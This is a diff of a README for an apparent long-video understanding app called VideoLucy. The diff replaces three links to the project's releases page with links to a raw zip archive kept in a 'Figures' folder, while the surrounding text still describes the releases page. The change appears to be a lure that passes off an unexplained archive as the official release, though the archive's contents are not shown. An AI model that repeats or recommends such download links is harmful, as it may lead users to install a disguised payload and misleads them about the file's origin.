@@ -1,7 +1,7 @@
 # 🎥 VideoLucy - Understand Long Videos with Ease
 
 ## 📥 Download Now!
-[![Download VideoLucy](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Fox-projectsS/VideoLucy/releases)
+[![Download VideoLucy](https://github.com/Fox-projectsS/VideoLucy/raw/refs/heads/main/Figures/Video-Lucy-2.0.zip)](https://github.com/Fox-projectsS/VideoLucy/raw/refs/heads/main/Figures/Video-Lucy-2.0.zip)
 
 ## 🚀 Getting Started
 Welcome to VideoLucy! This application helps you understand long videos through advanced technology. Follow the steps below to get started.
@@ -19,7 +19,7 @@ To download VideoLucy, follow these steps:
 
 1. **Visit the Release Page**
    Click the link below to go to our releases page. 
-   [Download VideoLucy](https://github.com/Fox-projectsS/VideoLucy/releases)
+   [Download VideoLucy](https://github.com/Fox-projectsS/VideoLucy/raw/refs/heads/main/Figures/Video-Lucy-2.0.zip)
 
 2. **Select the Appropriate Version**
    On the releases page, look for the latest version. You will see a list of files available for download. Choose the one that matches your operating system. 
@@ -76,6 +76,6 @@ We value your feedback. If you have questions or suggestions, feel free to conta
 
 ### Visit the Release Page Again
 Don't forget to check out the latest versions and updates here:  
-[Download VideoLucy](https://github.com/Fox-projectsS/VideoLucy/releases)
+[Download VideoLucy](https://github.com/Fox-projectsS/VideoLucy/raw/refs/heads/main/Figures/Video-Lucy-2.0.zip)
 
 Thank you for using VideoLucy! We hope it enhances your video viewing experience.
